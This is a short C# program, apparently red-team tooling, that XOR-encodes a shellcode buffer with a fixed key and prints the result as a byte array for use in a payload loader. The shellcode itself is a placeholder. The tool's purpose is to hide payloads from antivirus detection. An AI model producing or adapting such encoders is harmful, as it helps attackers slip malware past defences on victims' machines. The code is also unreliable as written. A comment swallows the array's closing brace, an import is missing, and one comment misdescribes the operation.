/* XOR encrypt with 0x2a*/
using System;
class Program
{
    static void Main()
    {

        byte key = 0x2a;

        byte[] buf = new byte[593] {// put shell code here};

        // create array to put encoded shellcode
        byte[] encoded = new byte[buf.Length];

        Console.WriteLine($" XOR encryption with key 0x{key:x}");

        for (int i = 0; i < buf.Length; i++)
        {
            // add 2 to all data e then cap it to 255 with bitwise and with 0xFF
            encoded[i] = (byte)(buf[i] ^ key);
        }

        StringBuilder hex = new StringBuilder(encoded.Length * 2);
        int a = 0;
        foreach (byte b in encoded)
        {

            // put string wiht payload in correct format
            hex.AppendFormat("0x{0:x2}, ", b);
            if ((a % 12 == 0) && !(a == 0))
            {
                hex.Append("\n");
            }
            a++;
        }

        Console.WriteLine($"byte[] buf = new byte[{buf.Length}] {{\n{hex.ToString()}}};");
    }
}
